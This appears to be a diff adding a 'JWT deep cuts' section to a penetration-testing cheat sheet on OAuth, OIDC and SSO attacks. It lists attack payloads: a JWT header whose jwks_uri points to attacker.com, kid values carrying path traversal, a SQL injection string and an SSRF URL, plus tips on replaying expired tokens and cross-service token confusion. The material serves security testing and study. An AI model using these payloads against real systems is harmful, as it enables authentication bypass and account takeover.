@@ -80,6 +80,31 @@ Some servers allow requesting broader scopes than registered. Try adding undocum
 
 ---
 
+## JWT deep cuts
+
+**jwks_uri manipulation.** Some OIDC implementations trust the `jwks_uri` field in the JWT header itself. Replace it with your own JWKS endpoint, sign with your key, and the server fetches your public key to verify your own token.
+
+```json
+{"alg": "RS256", "jwks_uri": "https://attacker.com/jwks.json"}
+```
+
+**kid injection variants.** The `kid` header is sometimes used as a filename, SQL key, or URL to fetch the signing key:
+- `"kid": "../../dev/null"` - empty key, HMAC secret becomes empty string
+- `"kid": "' UNION SELECT 'attacker_key'--"` - SQLi in key lookup
+- `"kid": "https://attacker.com/key"` - SSRF on key fetch
+
+**Sensitive data in payload.** JWT payload is base64-encoded, never encrypted. Always decode manually:
+```bash
+echo "eyJzdWIiOiIxMjM0NTY3ODkwIn0" | base64 -d
+# look for: internal IDs, emails, roles, service names, env flags
+```
+
+**Expired token not checked.** Try replaying an old token from browser history or proxy logs. Some implementations skip `exp` validation.
+
+**Microservice token confusion.** If services A and B share the same JWT secret, a token issued for A may be accepted by B. Different services may also interpret the same claim differently (e.g., `role: "admin"` means different things in different services).
+
+---
+
 ## SSO trust chain attacks
 
 If the victim app trusts any of several identity providers, compromising any one of them compromises all downstream apps. Also:
